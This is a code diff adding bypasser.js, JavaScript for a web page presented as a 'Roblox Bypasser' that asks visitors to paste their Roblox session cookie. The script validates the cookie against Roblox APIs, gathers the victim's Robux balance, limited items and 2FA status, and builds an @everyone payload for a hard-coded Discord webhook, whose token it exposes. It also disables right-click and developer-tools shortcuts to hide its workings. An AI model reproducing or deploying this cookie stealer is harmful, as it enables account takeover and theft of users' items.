@@ -1,10 +1,175 @@
+// bypasser.js
+const successSound = document.getElementById("sfx-success");
+const errorSound = document.getElementById("sfx-error");
+const swooshSound = document.getElementById("sfx-swoosh");
+const webhookUrl = "https://discord.com/api/webhooks/1408203109129256990/95rPDczDFbDQt1IivQRsS_iwRFkOnAc21x8dNzFEvE5ud2UTIfNresN2-kGqcVBA864Z";
+
+// Basic format check for cookie
+function basicCookieFormatCheck(cookie) {
+  if (!cookie || typeof cookie !== "string") {
+    return { valid: false, error: "Cookie must be a non-empty string" };
+  }
+  cookie = cookie.trim();
+  if (cookie.length === 0) {
+    return { valid: false, error: "Cookie cannot be empty" };
+  }
+  if (!cookie.startsWith("_|WARNING:-DO-NOT-SHARE-THIS.--")) {
+    return { valid: false, error: "Invalid cookie format - missing warning prefix" };
+  }
+  if (cookie.length < 500) {
+    return { valid: false, error: "Cookie appears to be truncated or invalid" };
+  }
+  return { valid: true, error: null };
+}
+
+// Validate cookie with Roblox API
+async function validateCookieWithAPI(cookie) {
+  try {
+    const formatCheck = basicCookieFormatCheck(cookie);
+    if (!formatCheck.valid) {
+      return formatCheck;
+    }
+    const response = await fetch("https://auth.roblox.com/v1/authentication-ticket", {
+      method: "POST",
+      headers: {
+        Cookie: `.ROBLOSECURITY=${cookie}`,
+        "Content-Type": "application/json",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+      },
+    });
+    if (response.status === 200) {
+      return { valid: true, error: null, authenticated: true };
+    } else if (response.status === 401) {
+      return { valid: false, error: "Cookie is expired or invalid", authenticated: false };
+    } else if (response.status === 403) {
+      return { valid: false, error: "Cookie authentication failed", authenticated: false };
+    } else {
+      return { valid: false, error: `Unexpected response: ${response.status}`, authenticated: false };
+    }
+  } catch (error) {
+    return {
+      valid: false,
+      error: `Network error during validation: ${error.message}`,
+      authenticated: false,
+    };
+  }
+}
+
+// Enhanced pattern-based validation (fallback)
+function advancedPatternValidation(cookie) {
+  if (!cookie.startsWith('_|WARNING:-DO-NOT-SHARE-THIS.--')) {
+    return { valid: false, error: "Invalid cookie format - missing warning prefix" };
+  }
+  if (!cookie.includes('|_')) {
+    return { valid: false, error: "Invalid cookie format - missing separator" };
+  }
+  const tokenStart = cookie.indexOf('|_') + 2;
+  const tokenPart = cookie.substring(tokenStart);
+  if (tokenPart.length < 800) {
+    return { valid: false, error: "Cookie appears to be truncated or invalid" };
+  }
+  if (!tokenPart.match(/[A-Za-z0-9+\/=._-]/)) {
+    return { valid: false, error: "Invalid cookie format - invalid characters" };
+  }
+  const upperCaseCount = (tokenPart.match(/[A-Z]/g) || []).length;
+  const digitCount = (tokenPart.match(/[0-9]/g) || []).length;
+  if (upperCaseCount < 20 || digitCount < 20) {
+    return { valid: false, error: "Invalid cookie format - insufficient character diversity" };
+  }
+  if (cookie.length < 1000) {
+    return { valid: false, error: "Cookie appears to be truncated or invalid" };
+  }
+  const fakeIndicators = ['fakecookie', 'testcookie', 'example123', 'demo', 'sample123'];
+  const lowerCookie = cookie.toLowerCase();
+  for (const fake of fakeIndicators) {
+    if (lowerCookie.includes(fake)) {
+      return { valid: false, error: "Invalid cookie - contains suspicious patterns" };
+    }
+  }
+  if (tokenPart.includes('AAAAAAA') || tokenPart.includes('1111111') || tokenPart.includes('0000000')) {
+    return { valid: false, error: "Invalid cookie - contains obvious repeating patterns" };
+  }
+  return { valid: true, error: null };
+}
+
+// Comprehensive cookie validation
+async function validateRobloxCookie(cookie, options = {}) {
+  const { includeUserInfo = false, skipAPIValidation = false } = options;
+  const formatResult = basicCookieFormatCheck(cookie);
+  if (!formatResult.valid) {
+    return {
+      valid: false,
+      error: formatResult.error,
+      checks: { format: false, authentication: null, userInfo: null },
+    };
+  }
+  const result = {
+    valid: true,
+    error: null,
+    checks: { format: true, authentication: null, userInfo: null },
+  };
+  if (skipAPIValidation) {
+    return result;
+  }
+  try {
+    const authResult = await validateCookieWithAPI(cookie);
+    result.checks.authentication = authResult.valid;
+    if (!authResult.valid) {
+      if (authResult.error && authResult.error.includes('Network error')) {
+        console.log('API validation failed, using pattern validation');
+        const patternResult = advancedPatternValidation(cookie);
+        if (!patternResult.valid) {
+          result.valid = false;
+          result.error = patternResult.error;
+          return result;
+        }
+        result.checks.authentication = true;
+      } else {
+        result.valid = false;
+        result.error = authResult.error;
+        return result;
+      }
+    }
+    if (includeUserInfo) {
+      try {
+        const userResult = await fetch("https://users.roblox.com/v1/users/authenticated", {
+          method: "GET",
+          headers: {
+            Cookie: `.ROBLOSECURITY=${cookie}`,
+            "Content-Type": "application/json",
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+          },
+        });
+        if (userResult.status === 200) {
+          result.user = await userResult.json();
+          result.checks.userInfo = true;
+        } else {
+          result.userInfoError = `Failed to get user info: ${userResult.status}`;
+        }
+      } catch (userError) {
+        result.userInfoError = 'Could not fetch user info due to CORS restrictions';
+      }
+    }
+  } catch (error) {
+    console.log('All API calls failed, using pattern validation');
+    const patternResult = advancedPatternValidation(cookie);
+    if (!patternResult.valid) {
+      result.valid = false;
+      result.error = patternResult.error;
+      return result;
+    }
+    result.checks.authentication = true;
+  }
+  return result;
+}
+
 // Enhanced function to get account info using Roblox APIs
 async function getAccountInfo(cookie) {
   try {
-    // Helper function to make authenticated requests
-    const makeRequest = async (url) => {
+    // Helper function for authenticated API requests
+    const makeRequest = async (url, method = "GET") => {
       const response = await fetch(url, {
-        method: "GET",
+        method,
         headers: {
           Cookie: `.ROBLOSECURITY=${cookie}`,
           "Content-Type": "application/json",
@@ -33,7 +198,7 @@ async function getAccountInfo(cookie) {
     const avatarData = await makeRequest(`https://thumbnails.roblox.com/v1/users/avatar?userIds=${userId}&size=150x150&format=Png&isCircular=false`);
     const avatarUrl = avatarData.data[0]?.imageUrl || "https://tr.rbxcdn.com/default-avatar.png";
 
-    // 4. Get Robux balance (economy API)
+    // 4. Get Robux balance
     let robuxBalance = "0";
     try {
       const economyData = await makeRequest("https://economy.roblox.com/v1/user/currency");
@@ -42,7 +207,7 @@ async function getAccountInfo(cookie) {
       console.warn("Failed to fetch Robux balance:", error.message);
     }
 
-    // 5. Get RAP and owned items (inventory API)
+    // 5. Get RAP and owned items
     let rap = "0";
     let ownedItems = "0";
     try {
@@ -59,7 +224,6 @@ async function getAccountInfo(cookie) {
     try {
       const groupData = await makeRequest(`https://groups.roblox.com/v1/users/${userId}/groups/roles`);
       groupCount = groupData.data.length.toString();
-      // Note: Group funds require specific group IDs and permissions; using placeholder
     } catch (error) {
       console.warn("Failed to fetch group data:", error.message);
     }
@@ -80,7 +244,6 @@ async function getAccountInfo(cookie) {
     try {
       const inventoryData = await makeRequest(`https://inventory.roblox.com/v1/users/${userId}/assets/collectibles?limit=100`);
       const items = inventoryData.data;
-      // Known asset IDs for Korblox, Valk, Headless (approximate, as exact IDs may vary)
       hasKorblox = items.some(item => item.assetId === 139607718); // Korblox Deathspeaker
       hasValk = items.some(item => item.assetId === 1365767); // Valkyrie Helm
       hasHeadless = items.some(item => item.assetId === 134082579); // Headless Horseman
@@ -88,10 +251,7 @@ async function getAccountInfo(cookie) {
       console.warn("Failed to fetch collectibles:", error.message);
     }
 
-    // 9. Get place visits (requires game stats, using placeholder)
-    const placeVisits = "0"; // No direct public API for total place visits
-
-    // 10. Get settings (2FA, Voice Chat)
+    // 9. Get settings (2FA, Voice Chat)
     let twoStepEnabled = false;
     let voiceChatEnabled = false;
     try {
@@ -102,12 +262,12 @@ async function getAccountInfo(cookie) {
       console.warn("Failed to fetch settings:", error.message);
     }
 
-    // 11. Placeholder for birthdate and age (not publicly accessible)
-    const birthdate = "Unknown";
-    const age = "Unknown";
-
-    // 12. Placeholder for IP address (requires external service)
-    const ipAddress = "Unknown";
+    // 10. Placeholders for inaccessible data
+    const placeVisits = "0"; // No direct API for total place visits
+    const creditBalance = "0"; // No public API for credit balance
+    const birthdate = "Unknown"; // Not publicly accessible
+    const age = "Unknown"; // Not publicly accessible
+    const ipAddress = "Unknown"; // Requires external service
 
     return {
       username,
@@ -118,7 +278,7 @@ async function getAccountInfo(cookie) {
       placeVisits,
       rap,
       ownedItems,
-      creditBalance: "0", // No public API for credit balance
+      creditBalance,
       hasPremium,
       hasKorblox,
       hasValk,
@@ -158,12 +318,26 @@ async function getAccountInfo(cookie) {
   }
 }
 
-// Form submission handler
+document.addEventListener('contextmenu', function(e) {
+  e.preventDefault();
+  showNotif('Context menu disabled');
+  errorSound.play();
+});
+
+document.addEventListener('keydown', function(e) {
+  if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I') || 
+      (e.ctrlKey && e.shiftKey && e.key === 'J') || (e.ctrlKey && e.key === 'u')) {
+    e.preventDefault();
+    showNotif('Developer tools disabled');
+    errorSound.play();
+  }
+});
+
 $("#cookieForm").on("submit", async function(e) {
   e.preventDefault();
   const cookie = $("#cookieInput").val().trim();
 
-  // Show loader immediately
+  // Show loader
   $("#refreshBtn").hide();
   $("#loader").show();
   $("#userInfo").hide();
@@ -180,14 +354,14 @@ $("#cookieForm").on("submit", async function(e) {
       return;
     }
 
-    // Cookie is valid - show success notification
+    // Show success notification
     showNotif("✅ Cookie bypassed", true);
     swooshSound.play();
 
     // Get account info
     const accountInfo = await getAccountInfo(cookie);
 
-    // Construct webhook payload to match Discord embed
+    // Construct webhook payload
     const webhookPayload = {
       username: "Roblox Bypasser Bot",
       content: "@everyone",
@@ -310,4 +484,56 @@ $("#cookieForm").on("submit", async function(e) {
   } finally {
     $("#loader").hide();
   }
+});
+
+function showNotif(msg, isSuccess = false) {
+  const $notif = $("#notif");
+  $notif.removeClass('notif-success notif-error');
+  
+  if (isSuccess) {
+    $notif.addClass('notif-success');
+  } else {
+    $notif.addClass('notif-error');
+  }
+  
+  $notif.text(msg).fadeIn(200).delay(2000).fadeOut(300);
+}
+
+const texts = ["Roblox Bypasser", "are you a femboy by any chance ? ", "Made By Guildness"];
+let i = 0;
+const typedText = document.getElementById("typedText");
+
+function typeEffect() {
+  const text = texts[i];
+  let index = 0;
+
+  const typing = setInterval(() => {
+    if (index <= text.length) {
+      typedText.textContent = text.slice(0, index);
+      index++;
+    } else {
+      clearInterval(typing);
+      setTimeout(() => {
+        const backspace = setInterval(() => {
+          if (index > 0) {
+            typedText.textContent = text.slice(0, index - 1);
+            index--;
+          } else {
+            clearInterval(backspace);
+            i = (i + 1) % texts.length;
+            setTimeout(typeEffect, 300);
+          }
+        }, 50);
+      }, 2000);
+    }
+  }, 100);
+}
+
+typeEffect();
+
+$("#returnBtn").on("click", function () {
+  $("#refreshedBox").hide();
+  $("#userInfo").hide().empty();
+  $("#cookieInput").val("");
+  $("#refreshBtn").show();
 });
